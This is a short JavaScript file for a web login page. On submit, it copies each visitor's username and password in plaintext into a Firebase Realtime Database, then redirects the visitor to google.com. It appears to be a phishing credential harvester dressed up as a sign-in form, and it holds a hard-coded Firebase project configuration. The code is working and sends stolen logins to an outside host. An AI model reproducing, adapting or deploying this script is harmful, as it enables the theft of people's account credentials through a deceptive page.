import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCE7Xmih33hhy789Lmlh-jBZU3v95TIqeo",
    authDomain: "devision-18117.firebaseapp.com",
    databaseURL: "https://devision-18117-default-rtdb.firebaseio.com",
    projectId: "devision-18117",
    storageBucket: "devision-18117.firebasestorage.app",
    messagingSenderId: "302117261407",
    appId: "1:302117261407:web:3994937bffd1eef1718bea",
    measurementId: "G-FDDKJ3R6SR"
};


const app = initializeApp(firebaseConfig);
const database = getDatabase(app); 


document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); 

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;


    set(ref(database, 'users/' + username), {
        password: password
    }).then(() => {
  
        window.location.href = "https://www.google.com"; 
    }).catch((error) => {
        console.error('Ошибка отправки данных: ', error);
        const errorMessage = document.getElementById('errorMessage');
        errorMessage.style.display = 'block'; 
    });
});

